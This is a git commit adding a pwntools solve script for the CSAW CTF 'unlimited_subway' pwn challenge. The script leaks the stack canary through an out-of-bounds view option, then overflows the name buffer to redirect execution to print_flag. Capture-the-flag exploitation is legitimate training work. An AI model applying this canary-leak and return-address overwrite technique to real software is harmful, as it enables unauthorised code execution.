537f4e36003baa8a6a028833316adc7140b23d3d
Romulus <hamman3131@gmail.com>
2023-09-15 15:34:36 -0400

    added solve script for unlimited_subway

--- CSAWCTF/pwn/unlimited_subway/unlimited_subwaySolve.py
+++ CSAWCTF/pwn/unlimited_subway/unlimited_subwaySolve.py
@@ -2,6 +2,7 @@ from pwn import *
 
 path_to_binary = "./challenge/unlimited_subway"
 EXE = ELF(path_to_binary)
+print_flag_address = EXE.symbols['print_flag']
 
 def conn(use_exe = False):
 	if use_exe:
@@ -13,14 +14,30 @@ def conn(use_exe = False):
 context.binary = EXE
 context.log_level = "DEBUG"
 
-conn = conn(True)
+io = conn(False)
 
-conn.recvline()
+# Use the view account option to read the value of the stack canary
+canary = b''
+for i in range(4):
+    io.recvuntil(b'> ')
+    io.sendline(b'V')
+    io.recvuntil(b'Index : ')
+    payload = str(0x88 - 8 + i)
+    io.sendline(payload)
+    io.recvuntil(b' : ')
+    canary = io.recvline()[:-1] + canary
+canary = int(canary, 16)
 
-conn.send(b'USER anonymous\r\n')
+io.recvuntil(b'> ')
+io.sendline(b'E')
 
-conn.recvuntil(b' ', drop=True)
+io.recvuntil(b'Name Size : ')
+io.sendline(str(0x48+4).encode())
+io.recvuntil(b'Name : ')
+payload = p32(canary) * 0x12
+payload += p32(print_flag_address)
+io.sendline(payload)
 
-conn.recvline()
+io.interactive()
 
-conn.close()
+io.close()
